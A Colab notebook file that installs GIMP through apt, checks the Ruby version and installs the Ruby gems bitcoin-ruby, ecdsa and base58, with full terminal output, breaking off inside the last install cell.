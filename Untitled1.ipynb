{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "mount_file_id": "1afuuGKv7nfUIWQaaR_SiMpVNuKf5r7Xf",
      "authorship_tag": "ABX9TyN+GJJOpmyEJkE8IouCaF8D",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Fedu1ov/BoB/blob/main/Untitled1.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 177,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "DC4Rwx0Af3bP",
        "outputId": "4f6d9af0-7ed4-44ff-9f33-f747524bd65a"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[1;31mE: \u001b[0mInvalid operation version\u001b[0m\n"
          ]
        }
      ],
      "source": [
        "!sudo apt version"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt install apt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9oPFNUdT5kZ4",
        "outputId": "3759e70e-18ca-4949-f5ca-b425a4883018"
      },
      "execution_count": 160,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "apt is already the newest version (2.4.13).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 49 not upgraded.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt install gimp"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "BzEzFLqJ5SMQ",
        "outputId": "96b53217-b288-4750-add6-f32cf6402562"
      },
      "execution_count": 155,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "The following additional packages will be installed:\n",
            "  fonts-droid-fallback fonts-noto-mono fonts-urw-base35 ghostscript gimp-data\n",
            "  libaa1 libamd2 libbabl-0.1-0 libcamd2 libccolamd2 libcholmod3 libcolamd2\n",
            "  libexiv2-27 libgail-common libgail18 libgegl-0.4-0 libgegl-common\n",
            "  libgexiv2-2 libgimp2.0 libgs9 libgs9-common libgtk2.0-0 libgtk2.0-bin\n",
            "  libgtk2.0-common libgudev-1.0-0 libidn12 libijs-0.35 libjbig2dec0\n",
            "  libjson-glib-1.0-0 libjson-glib-1.0-common libmetis5 libmng2\n",
            "  libmypaint-1.5-1 libmypaint-common libpoppler-glib8 libraw20 librsvg2-common\n",
            "  libsuitesparseconfig5 libumfpack5 libwmf-0.2-7 libwmflite-0.2-7 poppler-data\n",
            "Suggested packages:\n",
            "  fonts-noto fonts-freefont-otf | fonts-freefont-ttf fonts-texgyre\n",
            "  ghostscript-x gimp-help-en | gimp-help gimp-data-extras gvfs-backends exiv2\n",
            "  gvfs libwmf-0.2-7-gtk poppler-utils fonts-japanese-mincho\n",
            "  | fonts-ipafont-mincho fonts-japanese-gothic | fonts-ipafont-gothic\n",
            "  fonts-arphic-ukai fonts-arphic-uming fonts-nanum\n",
            "The following NEW packages will be installed:\n",
            "  fonts-droid-fallback fonts-noto-mono fonts-urw-base35 ghostscript gimp\n",
            "  gimp-data libaa1 libamd2 libbabl-0.1-0 libcamd2 libccolamd2 libcholmod3\n",
            "  libcolamd2 libexiv2-27 libgail-common libgail18 libgegl-0.4-0 libgegl-common\n",
            "  libgexiv2-2 libgimp2.0 libgs9 libgs9-common libgtk2.0-0 libgtk2.0-bin\n",
            "  libgtk2.0-common libgudev-1.0-0 libidn12 libijs-0.35 libjbig2dec0\n",
            "  libjson-glib-1.0-0 libjson-glib-1.0-common libmetis5 libmng2\n",
            "  libmypaint-1.5-1 libmypaint-common libpoppler-glib8 libraw20 librsvg2-common\n",
            "  libsuitesparseconfig5 libumfpack5 libwmf-0.2-7 libwmflite-0.2-7 poppler-data\n",
            "0 upgraded, 43 newly installed, 0 to remove and 49 not upgraded.\n",
            "Need to get 37.7 MB of archives.\n",
            "After this operation, 169 MB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 fonts-droid-fallback all 1:6.0.1r16-1.1build1 [1,805 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu jammy/main amd64 poppler-data all 0.4.11-1 [2,171 kB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy/main amd64 fonts-noto-mono all 20201225-1build1 [397 kB]\n",
            "Get:4 http://archive.ubuntu.com/ubuntu jammy/main amd64 fonts-urw-base35 all 20200910-1 [6,367 kB]\n",
            "Get:5 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgs9-common all 9.55.0~dfsg1-0ubuntu5.10 [752 kB]\n",
            "Get:6 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libidn12 amd64 1.38-4ubuntu1 [60.0 kB]\n",
            "Get:7 http://archive.ubuntu.com/ubuntu jammy/main amd64 libijs-0.35 amd64 0.35-15build2 [16.5 kB]\n",
            "Get:8 http://archive.ubuntu.com/ubuntu jammy/main amd64 libjbig2dec0 amd64 0.19-3build2 [64.7 kB]\n",
            "Get:9 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgs9 amd64 9.55.0~dfsg1-0ubuntu5.10 [5,031 kB]\n",
            "Get:10 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ghostscript amd64 9.55.0~dfsg1-0ubuntu5.10 [49.4 kB]\n",
            "Get:11 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libbabl-0.1-0 amd64 1:0.1.92-1 [440 kB]\n",
            "Get:12 http://archive.ubuntu.com/ubuntu jammy/main amd64 libjson-glib-1.0-common all 1.6.6-1build1 [4,432 B]\n",
            "Get:13 http://archive.ubuntu.com/ubuntu jammy/main amd64 libjson-glib-1.0-0 amd64 1.6.6-1build1 [69.9 kB]\n",
            "Get:14 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libpoppler-glib8 amd64 22.02.0-2ubuntu0.5 [134 kB]\n",
            "Get:15 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libraw20 amd64 0.20.2-2ubuntu2.22.04.1 [342 kB]\n",
            "Get:16 http://archive.ubuntu.com/ubuntu jammy/main amd64 libsuitesparseconfig5 amd64 1:5.10.1+dfsg-4build1 [10.4 kB]\n",
            "Get:17 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libamd2 amd64 1:5.10.1+dfsg-4build1 [21.6 kB]\n",
            "Get:18 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libcamd2 amd64 1:5.10.1+dfsg-4build1 [23.3 kB]\n",
            "Get:19 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libccolamd2 amd64 1:5.10.1+dfsg-4build1 [25.2 kB]\n",
            "Get:20 http://archive.ubuntu.com/ubuntu jammy/main amd64 libcolamd2 amd64 1:5.10.1+dfsg-4build1 [18.0 kB]\n",
            "Get:21 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libmetis5 amd64 5.1.0.dfsg-7build2 [181 kB]\n",
            "Get:22 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libcholmod3 amd64 1:5.10.1+dfsg-4build1 [346 kB]\n",
            "Get:23 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libumfpack5 amd64 1:5.10.1+dfsg-4build1 [250 kB]\n",
            "Get:24 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libgegl-common all 1:0.4.34-1build1 [866 kB]\n",
            "Get:25 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libgegl-0.4-0 amd64 1:0.4.34-1build1 [1,392 kB]\n",
            "Get:26 http://archive.ubuntu.com/ubuntu jammy/main amd64 libexiv2-27 amd64 0.27.5-3ubuntu1 [844 kB]\n",
            "Get:27 http://archive.ubuntu.com/ubuntu jammy/main amd64 libgexiv2-2 amd64 0.14.0-1build1 [81.4 kB]\n",
            "Get:28 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgtk2.0-common all 2.24.33-2ubuntu2.1 [125 kB]\n",
            "Get:29 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgtk2.0-0 amd64 2.24.33-2ubuntu2.1 [2,038 kB]\n",
            "Get:30 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 libgimp2.0 amd64 2.10.30-1ubuntu0.1 [501 kB]\n",
            "Get:31 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 gimp-data all 2.10.30-1ubuntu0.1 [7,597 kB]\n",
            "Get:32 http://archive.ubuntu.com/ubuntu jammy/main amd64 libaa1 amd64 1.4p5-50build1 [51.9 kB]\n",
            "Get:33 http://archive.ubuntu.com/ubuntu jammy/main amd64 libgudev-1.0-0 amd64 1:237-2build1 [16.3 kB]\n",
            "Get:34 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libmng2 amd64 2.0.3+dfsg-3 [168 kB]\n",
            "Get:35 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libmypaint-common all 1.6.0-2 [140 kB]\n",
            "Get:36 http://archive.ubuntu.com/ubuntu jammy/universe amd64 libmypaint-1.5-1 amd64 1.6.0-2 [49.0 kB]\n",
            "Get:37 http://archive.ubuntu.com/ubuntu jammy/main amd64 libwmflite-0.2-7 amd64 0.2.12-5ubuntu1 [68.9 kB]\n",
            "Get:38 http://archive.ubuntu.com/ubuntu jammy/main amd64 libwmf-0.2-7 amd64 0.2.12-5ubuntu1 [94.2 kB]\n",
            "Get:39 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 gimp amd64 2.10.30-1ubuntu0.1 [4,921 kB]\n",
            "Get:40 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgail18 amd64 2.24.33-2ubuntu2.1 [15.9 kB]\n",
            "Get:41 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgail-common amd64 2.24.33-2ubuntu2.1 [132 kB]\n",
            "Get:42 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libgtk2.0-bin amd64 2.24.33-2ubuntu2.1 [7,936 B]\n",
            "Get:43 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 librsvg2-common amd64 2.52.5+dfsg-3ubuntu0.2 [17.7 kB]\n",
            "Fetched 37.7 MB in 1s (33.3 MB/s)\n",
            "debconf: unable to initialize frontend: Dialog\n",
            "debconf: (No usable dialog-like program is installed, so the dialog based frontend cannot be used. at /usr/share/perl5/Debconf/FrontEnd/Dialog.pm line 78, <> line 43.)\n",
            "debconf: falling back to frontend: Readline\n",
            "debconf: unable to initialize frontend: Readline\n",
            "debconf: (This frontend requires a controlling tty.)\n",
            "debconf: falling back to frontend: Teletype\n",
            "dpkg-preconfigure: unable to re-open stdin: \n",
            "Selecting previously unselected package fonts-droid-fallback.\n",
            "(Reading database ... 139988 files and directories currently installed.)\n",
            "Preparing to unpack .../00-fonts-droid-fallback_1%3a6.0.1r16-1.1build1_all.deb ...\n",
            "Unpacking fonts-droid-fallback (1:6.0.1r16-1.1build1) ...\n",
            "Selecting previously unselected package poppler-data.\n",
            "Preparing to unpack .../01-poppler-data_0.4.11-1_all.deb ...\n",
            "Unpacking poppler-data (0.4.11-1) ...\n",
            "Selecting previously unselected package fonts-noto-mono.\n",
            "Preparing to unpack .../02-fonts-noto-mono_20201225-1build1_all.deb ...\n",
            "Unpacking fonts-noto-mono (20201225-1build1) ...\n",
            "Selecting previously unselected package fonts-urw-base35.\n",
            "Preparing to unpack .../03-fonts-urw-base35_20200910-1_all.deb ...\n",
            "Unpacking fonts-urw-base35 (20200910-1) ...\n",
            "Selecting previously unselected package libgs9-common.\n",
            "Preparing to unpack .../04-libgs9-common_9.55.0~dfsg1-0ubuntu5.10_all.deb ...\n",
            "Unpacking libgs9-common (9.55.0~dfsg1-0ubuntu5.10) ...\n",
            "Selecting previously unselected package libidn12:amd64.\n",
            "Preparing to unpack .../05-libidn12_1.38-4ubuntu1_amd64.deb ...\n",
            "Unpacking libidn12:amd64 (1.38-4ubuntu1) ...\n",
            "Selecting previously unselected package libijs-0.35:amd64.\n",
            "Preparing to unpack .../06-libijs-0.35_0.35-15build2_amd64.deb ...\n",
            "Unpacking libijs-0.35:amd64 (0.35-15build2) ...\n",
            "Selecting previously unselected package libjbig2dec0:amd64.\n",
            "Preparing to unpack .../07-libjbig2dec0_0.19-3build2_amd64.deb ...\n",
            "Unpacking libjbig2dec0:amd64 (0.19-3build2) ...\n",
            "Selecting previously unselected package libgs9:amd64.\n",
            "Preparing to unpack .../08-libgs9_9.55.0~dfsg1-0ubuntu5.10_amd64.deb ...\n",
            "Unpacking libgs9:amd64 (9.55.0~dfsg1-0ubuntu5.10) ...\n",
            "Selecting previously unselected package ghostscript.\n",
            "Preparing to unpack .../09-ghostscript_9.55.0~dfsg1-0ubuntu5.10_amd64.deb ...\n",
            "Unpacking ghostscript (9.55.0~dfsg1-0ubuntu5.10) ...\n",
            "Selecting previously unselected package libbabl-0.1-0:amd64.\n",
            "Preparing to unpack .../10-libbabl-0.1-0_1%3a0.1.92-1_amd64.deb ...\n",
            "Unpacking libbabl-0.1-0:amd64 (1:0.1.92-1) ...\n",
            "Selecting previously unselected package libjson-glib-1.0-common.\n",
            "Preparing to unpack .../11-libjson-glib-1.0-common_1.6.6-1build1_all.deb ...\n",
            "Unpacking libjson-glib-1.0-common (1.6.6-1build1) ...\n",
            "Selecting previously unselected package libjson-glib-1.0-0:amd64.\n",
            "Preparing to unpack .../12-libjson-glib-1.0-0_1.6.6-1build1_amd64.deb ...\n",
            "Unpacking libjson-glib-1.0-0:amd64 (1.6.6-1build1) ...\n",
            "Selecting previously unselected package libpoppler-glib8:amd64.\n",
            "Preparing to unpack .../13-libpoppler-glib8_22.02.0-2ubuntu0.5_amd64.deb ...\n",
            "Unpacking libpoppler-glib8:amd64 (22.02.0-2ubuntu0.5) ...\n",
            "Selecting previously unselected package libraw20:amd64.\n",
            "Preparing to unpack .../14-libraw20_0.20.2-2ubuntu2.22.04.1_amd64.deb ...\n",
            "Unpacking libraw20:amd64 (0.20.2-2ubuntu2.22.04.1) ...\n",
            "Selecting previously unselected package libsuitesparseconfig5:amd64.\n",
            "Preparing to unpack .../15-libsuitesparseconfig5_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libsuitesparseconfig5:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libamd2:amd64.\n",
            "Preparing to unpack .../16-libamd2_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libcamd2:amd64.\n",
            "Preparing to unpack .../17-libcamd2_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libcamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libccolamd2:amd64.\n",
            "Preparing to unpack .../18-libccolamd2_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libccolamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libcolamd2:amd64.\n",
            "Preparing to unpack .../19-libcolamd2_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libcolamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libmetis5:amd64.\n",
            "Preparing to unpack .../20-libmetis5_5.1.0.dfsg-7build2_amd64.deb ...\n",
            "Unpacking libmetis5:amd64 (5.1.0.dfsg-7build2) ...\n",
            "Selecting previously unselected package libcholmod3:amd64.\n",
            "Preparing to unpack .../21-libcholmod3_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libcholmod3:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libumfpack5:amd64.\n",
            "Preparing to unpack .../22-libumfpack5_1%3a5.10.1+dfsg-4build1_amd64.deb ...\n",
            "Unpacking libumfpack5:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Selecting previously unselected package libgegl-common.\n",
            "Preparing to unpack .../23-libgegl-common_1%3a0.4.34-1build1_all.deb ...\n",
            "Unpacking libgegl-common (1:0.4.34-1build1) ...\n",
            "Selecting previously unselected package libgegl-0.4-0:amd64.\n",
            "Preparing to unpack .../24-libgegl-0.4-0_1%3a0.4.34-1build1_amd64.deb ...\n",
            "Unpacking libgegl-0.4-0:amd64 (1:0.4.34-1build1) ...\n",
            "Selecting previously unselected package libexiv2-27:amd64.\n",
            "Preparing to unpack .../25-libexiv2-27_0.27.5-3ubuntu1_amd64.deb ...\n",
            "Unpacking libexiv2-27:amd64 (0.27.5-3ubuntu1) ...\n",
            "Selecting previously unselected package libgexiv2-2:amd64.\n",
            "Preparing to unpack .../26-libgexiv2-2_0.14.0-1build1_amd64.deb ...\n",
            "Unpacking libgexiv2-2:amd64 (0.14.0-1build1) ...\n",
            "Selecting previously unselected package libgtk2.0-common.\n",
            "Preparing to unpack .../27-libgtk2.0-common_2.24.33-2ubuntu2.1_all.deb ...\n",
            "Unpacking libgtk2.0-common (2.24.33-2ubuntu2.1) ...\n",
            "Selecting previously unselected package libgtk2.0-0:amd64.\n",
            "Preparing to unpack .../28-libgtk2.0-0_2.24.33-2ubuntu2.1_amd64.deb ...\n",
            "Unpacking libgtk2.0-0:amd64 (2.24.33-2ubuntu2.1) ...\n",
            "Selecting previously unselected package libgimp2.0:amd64.\n",
            "Preparing to unpack .../29-libgimp2.0_2.10.30-1ubuntu0.1_amd64.deb ...\n",
            "Unpacking libgimp2.0:amd64 (2.10.30-1ubuntu0.1) ...\n",
            "Selecting previously unselected package gimp-data.\n",
            "Preparing to unpack .../30-gimp-data_2.10.30-1ubuntu0.1_all.deb ...\n",
            "Unpacking gimp-data (2.10.30-1ubuntu0.1) ...\n",
            "Selecting previously unselected package libaa1:amd64.\n",
            "Preparing to unpack .../31-libaa1_1.4p5-50build1_amd64.deb ...\n",
            "Unpacking libaa1:amd64 (1.4p5-50build1) ...\n",
            "Selecting previously unselected package libgudev-1.0-0:amd64.\n",
            "Preparing to unpack .../32-libgudev-1.0-0_1%3a237-2build1_amd64.deb ...\n",
            "Unpacking libgudev-1.0-0:amd64 (1:237-2build1) ...\n",
            "Selecting previously unselected package libmng2:amd64.\n",
            "Preparing to unpack .../33-libmng2_2.0.3+dfsg-3_amd64.deb ...\n",
            "Unpacking libmng2:amd64 (2.0.3+dfsg-3) ...\n",
            "Selecting previously unselected package libmypaint-common.\n",
            "Preparing to unpack .../34-libmypaint-common_1.6.0-2_all.deb ...\n",
            "Unpacking libmypaint-common (1.6.0-2) ...\n",
            "Selecting previously unselected package libmypaint-1.5-1:amd64.\n",
            "Preparing to unpack .../35-libmypaint-1.5-1_1.6.0-2_amd64.deb ...\n",
            "Unpacking libmypaint-1.5-1:amd64 (1.6.0-2) ...\n",
            "Selecting previously unselected package libwmflite-0.2-7:amd64.\n",
            "Preparing to unpack .../36-libwmflite-0.2-7_0.2.12-5ubuntu1_amd64.deb ...\n",
            "Unpacking libwmflite-0.2-7:amd64 (0.2.12-5ubuntu1) ...\n",
            "Selecting previously unselected package libwmf-0.2-7:amd64.\n",
            "Preparing to unpack .../37-libwmf-0.2-7_0.2.12-5ubuntu1_amd64.deb ...\n",
            "Unpacking libwmf-0.2-7:amd64 (0.2.12-5ubuntu1) ...\n",
            "Selecting previously unselected package gimp.\n",
            "Preparing to unpack .../38-gimp_2.10.30-1ubuntu0.1_amd64.deb ...\n",
            "Unpacking gimp (2.10.30-1ubuntu0.1) ...\n",
            "Selecting previously unselected package libgail18:amd64.\n",
            "Preparing to unpack .../39-libgail18_2.24.33-2ubuntu2.1_amd64.deb ...\n",
            "Unpacking libgail18:amd64 (2.24.33-2ubuntu2.1) ...\n",
            "Selecting previously unselected package libgail-common:amd64.\n",
            "Preparing to unpack .../40-libgail-common_2.24.33-2ubuntu2.1_amd64.deb ...\n",
            "Unpacking libgail-common:amd64 (2.24.33-2ubuntu2.1) ...\n",
            "Selecting previously unselected package libgtk2.0-bin.\n",
            "Preparing to unpack .../41-libgtk2.0-bin_2.24.33-2ubuntu2.1_amd64.deb ...\n",
            "Unpacking libgtk2.0-bin (2.24.33-2ubuntu2.1) ...\n",
            "Selecting previously unselected package librsvg2-common:amd64.\n",
            "Preparing to unpack .../42-librsvg2-common_2.52.5+dfsg-3ubuntu0.2_amd64.deb ...\n",
            "Unpacking librsvg2-common:amd64 (2.52.5+dfsg-3ubuntu0.2) ...\n",
            "Setting up libmng2:amd64 (2.0.3+dfsg-3) ...\n",
            "Setting up libpoppler-glib8:amd64 (22.02.0-2ubuntu0.5) ...\n",
            "Setting up fonts-noto-mono (20201225-1build1) ...\n",
            "Setting up libwmflite-0.2-7:amd64 (0.2.12-5ubuntu1) ...\n",
            "Setting up libmypaint-common (1.6.0-2) ...\n",
            "Setting up libijs-0.35:amd64 (0.35-15build2) ...\n",
            "Setting up libbabl-0.1-0:amd64 (1:0.1.92-1) ...\n",
            "Setting up libmetis5:amd64 (5.1.0.dfsg-7build2) ...\n",
            "Setting up fonts-urw-base35 (20200910-1) ...\n",
            "Setting up libmypaint-1.5-1:amd64 (1.6.0-2) ...\n",
            "Setting up poppler-data (0.4.11-1) ...\n",
            "Setting up libexiv2-27:amd64 (0.27.5-3ubuntu1) ...\n",
            "Setting up libwmf-0.2-7:amd64 (0.2.12-5ubuntu1) ...\n",
            "Setting up libjbig2dec0:amd64 (0.19-3build2) ...\n",
            "Setting up libidn12:amd64 (1.38-4ubuntu1) ...\n",
            "Setting up librsvg2-common:amd64 (2.52.5+dfsg-3ubuntu0.2) ...\n",
            "Setting up libraw20:amd64 (0.20.2-2ubuntu2.22.04.1) ...\n",
            "Setting up gimp-data (2.10.30-1ubuntu0.1) ...\n",
            "Setting up libgegl-common (1:0.4.34-1build1) ...\n",
            "Setting up libjson-glib-1.0-common (1.6.6-1build1) ...\n",
            "Setting up libgtk2.0-common (2.24.33-2ubuntu2.1) ...\n",
            "Setting up fonts-droid-fallback (1:6.0.1r16-1.1build1) ...\n",
            "Setting up libgexiv2-2:amd64 (0.14.0-1build1) ...\n",
            "Setting up libsuitesparseconfig5:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libgudev-1.0-0:amd64 (1:237-2build1) ...\n",
            "Setting up libaa1:amd64 (1.4p5-50build1) ...\n",
            "Setting up libgs9-common (9.55.0~dfsg1-0ubuntu5.10) ...\n",
            "Setting up libamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libcolamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libgs9:amd64 (9.55.0~dfsg1-0ubuntu5.10) ...\n",
            "Setting up libgtk2.0-0:amd64 (2.24.33-2ubuntu2.1) ...\n",
            "Setting up ghostscript (9.55.0~dfsg1-0ubuntu5.10) ...\n",
            "Setting up libjson-glib-1.0-0:amd64 (1.6.6-1build1) ...\n",
            "Setting up libcamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libgail18:amd64 (2.24.33-2ubuntu2.1) ...\n",
            "Setting up libgtk2.0-bin (2.24.33-2ubuntu2.1) ...\n",
            "Setting up libccolamd2:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libcholmod3:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libgail-common:amd64 (2.24.33-2ubuntu2.1) ...\n",
            "Setting up libumfpack5:amd64 (1:5.10.1+dfsg-4build1) ...\n",
            "Setting up libgegl-0.4-0:amd64 (1:0.4.34-1build1) ...\n",
            "Setting up libgimp2.0:amd64 (2.10.30-1ubuntu0.1) ...\n",
            "Setting up gimp (2.10.30-1ubuntu0.1) ...\n",
            "Processing triggers for hicolor-icon-theme (0.17-2) ...\n",
            "Processing triggers for libc-bin (2.35-0ubuntu3.4) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_5.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbb.so.12 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbmalloc_proxy.so.2 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_adapter_opencl.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_loader.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libumf.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind_2_0.so.3 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtcm.so.1 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libhwloc.so.15 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtcm_debug.so.1 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libur_adapter_level_zero.so.0 is not a symbolic link\n",
            "\n",
            "/sbin/ldconfig.real: /usr/local/lib/libtbbbind.so.3 is not a symbolic link\n",
            "\n",
            "Processing triggers for man-db (2.10.2-1) ...\n",
            "Processing triggers for libgdk-pixbuf-2.0-0:amd64 (2.42.8+dfsg-1ubuntu0.3) ...\n",
            "Processing triggers for fontconfig (2.13.1-4.2ubuntu5) ...\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!sudo apt install ruby-v 3.0.2.107."
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "AoxSyZ-P9G3t",
        "outputId": "72da50e9-1df0-44d2-871f-672f094c3b48"
      },
      "execution_count": 181,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "\u001b[1;31mE: \u001b[0mUnable to locate package ruby-v\u001b[0m\n",
            "\u001b[1;31mE: \u001b[0mUnable to locate package 3.0.2.107.\u001b[0m\n",
            "\u001b[1;31mE: \u001b[0mCouldn't find any package by glob '3.0.2.107.'\u001b[0m\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!ruby --version"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ibb0kg_ngIsI",
        "outputId": "63bc9d39-521a-4887-becb-158794b5e3b3"
      },
      "execution_count": 182,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ruby 3.0.2p107 (2021-07-07 revision 0db68f0233) [x86_64-linux-gnu]\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install bitcoin-ruby"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gQ7_r9qWgLlc",
        "outputId": "7d0f30d1-b01e-4528-8d79-8157ef9114f1"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching bitcoin-ruby-0.0.20.gem\n",
            "Fetching scrypt-3.0.8.gem\n",
            "Fetching eventmachine-1.2.7.gem\n",
            "Fetching ffi-1.17.0.gem\n",
            "Fetching rake-13.2.1.gem\n",
            "Fetching ffi-compiler-1.3.2.gem\n",
            "Successfully installed rake-13.2.1\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed ffi-1.17.0\n",
            "Successfully installed ffi-compiler-1.3.2\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed scrypt-3.0.8\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed eventmachine-1.2.7\n",
            "Successfully installed bitcoin-ruby-0.0.20\n",
            "Parsing documentation for rake-13.2.1\n",
            "Installing ri documentation for rake-13.2.1\n",
            "Parsing documentation for ffi-1.17.0\n",
            "Installing ri documentation for ffi-1.17.0\n",
            "Parsing documentation for ffi-compiler-1.3.2\n",
            "Installing ri documentation for ffi-compiler-1.3.2\n",
            "Parsing documentation for scrypt-3.0.8\n",
            "Installing ri documentation for scrypt-3.0.8\n",
            "Parsing documentation for eventmachine-1.2.7\n",
            "Installing ri documentation for eventmachine-1.2.7\n",
            "Parsing documentation for bitcoin-ruby-0.0.20\n",
            "Installing ri documentation for bitcoin-ruby-0.0.20\n",
            "Done installing documentation for rake, ffi, ffi-compiler, scrypt, eventmachine, bitcoin-ruby after 14 seconds\n",
            "6 gems installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install ecdsa"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "80evOKPwgeEi",
        "outputId": "2c4bd0a2-b08f-4eb5-dc66-12c398abc3cf"
      },
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching ecdsa-1.2.0.gem\n",
            "Successfully installed ecdsa-1.2.0\n",
            "Parsing documentation for ecdsa-1.2.0\n",
            "Installing ri documentation for ecdsa-1.2.0\n",
            "Done installing documentation for ecdsa after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install base58"
